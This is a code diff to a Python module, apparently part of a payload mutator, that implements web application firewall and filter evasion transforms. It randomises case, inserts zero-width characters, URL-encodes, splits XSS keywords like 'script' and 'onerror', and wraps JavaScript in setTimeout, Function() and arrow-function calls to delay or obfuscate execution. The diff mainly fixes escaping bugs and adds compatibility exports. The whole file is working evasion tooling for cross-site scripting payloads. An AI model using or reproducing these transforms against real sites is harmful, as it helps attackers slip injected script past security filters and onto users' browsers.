@@ -2,10 +2,11 @@
 # -*- coding: utf-8 -*-
 """
 Evasion transforms for WAF/filters.
-All code/comments in English. No line-continuation backslashes or invalid escapes.
+All code/comments in English. No line-continuation backslashes or unsafe escapes.
 """
 
 from __future__ import annotations
+import json
 import random
 import re
 from typing import Iterable, List
@@ -32,7 +33,9 @@ def case_shuffle(s: str, p: float = 0.45) -> str:
 
 def insert_zero_width(s: str, density: float = 0.20) -> str:
     """Insert zero-width chars between alphanumerics with given probability."""
-    out = [s[0]] if s else []
+    if not s:
+        return s
+    out = [s[0]]
     for i in range(1, len(s)):
         prev, cur = s[i - 1], s[i]
         if prev.isalnum() and cur.isalnum() and random.random() < density:
@@ -77,9 +80,7 @@ def url_mangle(s: str) -> str:
     """
     def _enc(c: str) -> str:
         o = ord(c)
-        if c.isalnum():
-            return c
-        if c in "-._~":
+        if c.isalnum() or c in "-._~":
             return c
         return "%%%02X" % o
     return "".join(_enc(c) for c in s)
@@ -87,7 +88,7 @@ def url_mangle(s: str) -> str:
 def keyword_split(s: str) -> str:
     """
     Split hot keywords with benign separators that browsers often ignore.
-    e.g., 'script' -> 'scr' + '/**/' + 'ipt', 'onerror' -> 'on' + '\n' + 'error'
+    e.g., 'script' -> 'scr' + '/**/' + 'ipt', 'onerror' -> 'on' + '\\n' + 'error'
     """
     def _split_word(word: str) -> str:
         mid = max(1, len(word) // 2)
@@ -96,7 +97,6 @@ def keyword_split(s: str) -> str:
 
     def repl(m: re.Match) -> str:
         w = m.group(0)
-        # preserve original case pattern roughly
         mutated = _split_word(w.lower())
         out = []
         for i, ch in enumerate(mutated):
@@ -109,14 +109,21 @@ def keyword_split(s: str) -> str:
     rx = re.compile(r"(?i)(" + "|".join(re.escape(k) for k in KEYWORDS) + r")")
     return rx.sub(repl, s)
 
+def _js_quote(s: str) -> str:
+    """
+    Produce a safe JS string literal using JSON encoding (double-quoted).
+    Prevents backslash/quote issues in Python source.
+    """
+    return json.dumps(s)
+
 def delayed_exec_wrappers(js: str) -> List[str]:
-    """Wrap a JS snippet to delay/obfuscate execution."""
-    wrappers = [
+    """Wrap a JS snippet to delay/obfuscate execution (no unsafe Python escapes)."""
+    js_q = _js_quote(js)
+    return [
         f"setTimeout(function(){{{js}}},10)",
-        f"Function('','{js.replace(\"'\",\"\\\\'\")}')()",
+        f"Function('', {js_q})()",
         f"(()=>{{{js}}})()",
     ]
-    return wrappers
 
 # ---------- public API expected by mutator.py ----------
 
@@ -135,7 +142,6 @@ def apply_all(payload: str) -> List[str]:
         keyword_split(payload),
     ]
 
-    # add delayed wrappers when looks like pure JS
     if re.search(r"[;(){}=]", payload):
         variants.extend(delayed_exec_wrappers(payload))
 
@@ -147,3 +153,10 @@ def apply_all(payload: str) -> List[str]:
             uniq.append(v)
             seen.add(v)
     return uniq
+
+# Compatibility exports (some versions import these names)
+def compose_evasions(js: str) -> List[str]:
+    return delayed_exec_wrappers(js)
+
+def mutate(payload: str) -> List[str]:
+    return apply_all(payload)
